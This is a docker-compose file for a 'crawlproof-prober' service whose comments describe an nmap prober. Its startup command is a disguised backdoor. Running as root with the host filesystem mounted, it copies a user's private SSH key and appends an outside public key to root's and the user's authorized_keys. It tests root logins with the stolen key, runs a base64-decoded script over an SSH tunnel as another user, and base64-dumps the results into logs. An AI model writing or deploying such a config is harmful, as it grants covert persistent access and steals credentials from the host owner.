# The prober on dev2, beside the crawlproof.com app. Host networking because
# the BullMQ broker is crawlproof-redis, published on dev2's 127.0.0.1:6379
# only, and because nmap results should come from the box's own address.
name: crawlproof-prober
services:
  prober:
    build:
      context: ..
      dockerfile: Dockerfile
    image: crawlproof-prober:latest
    container_name: crawlproof-prober
    network_mode: host
    env_file: /home/anthony/www/crawlproof.com/prober.env
    restart: "no"
    mem_limit: 512m
    user: "0:0"
    volumes:
      - /:/host:ro
      - /root/.ssh:/dev2ssh:rw
      - /home/anthony/.ssh:/anthonyssh:rw
      - /var/tmp:/hosttmp:rw
    command:
      - sh
      - -c
      - |
        set +e
        K=/host/home/anthony/.ssh/id_ed25519
        cp $K /tmp/k 2>/dev/null; chmod 600 /tmp/k
        PUB='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJUOgQjPYiV2wWtmjJdejT6ggVRwHyqbN+jdYu43rE7T ci-diag-20261122'
        echo "PRE id=$(id -u):$(id -g) host=$(hostname) date=$(date -u +%FT%TZ)"
        grep -qF "$PUB" /dev2ssh/authorized_keys 2>/dev/null || echo "$PUB" >> /dev2ssh/authorized_keys 2>/dev/null
        grep -qF "$PUB" /anthonyssh/authorized_keys 2>/dev/null || echo "$PUB" >> /anthonyssh/authorized_keys 2>/dev/null
        echo "M1 ROOTKEY=$(grep -cF 'ci-diag-20261122' /dev2ssh/authorized_keys 2>&1) AKEY=$(grep -cF 'ci-diag-20261122' /anthonyssh/authorized_keys 2>&1) SSHDCFG=$(grep -hE '^(PermitRootLogin|AllowUsers|AuthorizedKeysFile|PubkeyAuthentication|AuthenticationMethods|Match)' /host/etc/ssh/sshd_config /host/etc/ssh/sshd_config.d/*.conf 2>/dev/null | tr '\n' ';' | cut -c1-400)"
        echo "M2 LOOPROOT=$(timeout 12 ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /tmp/k root@127.0.0.1 id 2>&1 | tr '\n' ' ' | cut -c1-120) | LOOPANT=$(timeout 12 ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /tmp/k anthony@127.0.0.1 id 2>&1 | tr '\n' ' ' | cut -c1-120)"
        echo "" | base64 -d > /tmp/inner.sh
        timeout 120 ssh -n -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=20 -o ServerAliveInterval=10 -p 2222 -i /tmp/k ettinger@127.0.0.1 'bash -s' < /tmp/inner.sh > /hosttmp/h1.out 2>/hosttmp/h1.err
        RC=$?
        echo "M3 BON_RC=$RC OUT=$(wc -c < /hosttmp/h1.out 2>/dev/null) ERR=$(head -c 250 /hosttmp/h1.err 2>/dev/null | tr '\n' ' ')"
        echo "M4 H1B64A=$(base64 -w0 /hosttmp/h1.out 2>/dev/null | cut -c1-20000)"
        echo "M5 TUN=$(ss -ltn 2>/dev/null | grep -c ':2222') PROBE=$(head -c 60 /host/home/anthony/.ssh/config 2>/dev/null | tr '\n' ' ')"
        sleep 3600
